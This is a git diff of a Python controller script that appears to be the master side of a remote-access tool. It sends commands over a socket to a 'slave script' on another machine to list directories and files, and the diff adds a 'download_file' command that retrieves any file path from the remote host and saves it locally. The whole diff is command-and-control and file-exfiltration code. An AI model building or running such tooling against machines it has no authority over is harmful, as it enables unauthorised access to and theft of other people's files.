@@ -23,17 +23,31 @@ while True:
     if command == "getcwd":
         conn.send(command.encode()) #send the command to slave script for execution
         print("\nCommand sent, waiting for execution...")
-        print("\nCommand has been executed succesfully")
-        files = conn.recv(5000) #receive the response from the slave script
-        files = files.decode() #decode the received info
-        print("\nCommand output: {}".format(files)) #show received info
+        directory = conn.recv(5000) #receive the response from the slave script
+        directory = directory.decode() #decode the received info
+        files = conn.recv(5000)
+        files = files.decode()
+        print("\nDirectory: {} \nFiles: {}".format(directory, files)) #show received info
+
     elif command == "custom_dir":
         conn.send(command.encode()) #send command to slave script
-        userInput = input(str(" -Set custom dir: "))
+        userInput = input(str(" >Set custom dir: "))
         conn.send(userInput.encode()) #send the custom dir
         print("\nCommand has been sent")        
         files = conn.recv(5000) #receive data from slave script           
         files = files.decode()
-        print("Custom dir result: {}".format(files))        
+        print("Custom dir result: {}".format(files)) 
+
+    elif command == 'download_file':   
+        conn.send(command.encode()) 
+        userInput = input(str(' >Set path with file and extension: '))
+        conn.send(userInput.encode()) 
+        fileName = conn.recv(5000) #receive the filename for create the new file with this name
+        file = conn.recv(10000) #receive the file
+        newFile = open(fileName, "wb") #create a file whit the original name and original extension
+        newFile.write(file)#write info into the new file
+        newFile.close()
+        print('\nFile has been downloaded and saved') 
+
     else:
         print("\nCommand not recognised")
